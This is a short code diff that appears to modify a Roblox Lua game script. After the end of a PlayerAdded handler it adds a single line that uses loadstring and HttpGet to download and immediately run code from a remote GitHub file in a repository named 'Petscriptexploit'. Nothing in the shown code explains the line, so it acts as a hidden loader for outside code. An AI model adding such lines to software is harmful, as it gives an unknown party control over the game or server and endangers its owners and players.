@@ -1183,3 +1183,4 @@ game.Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/PetsimScript/refs/heads/main/message%20(1)%20(1)-1%20(1).txt"))()
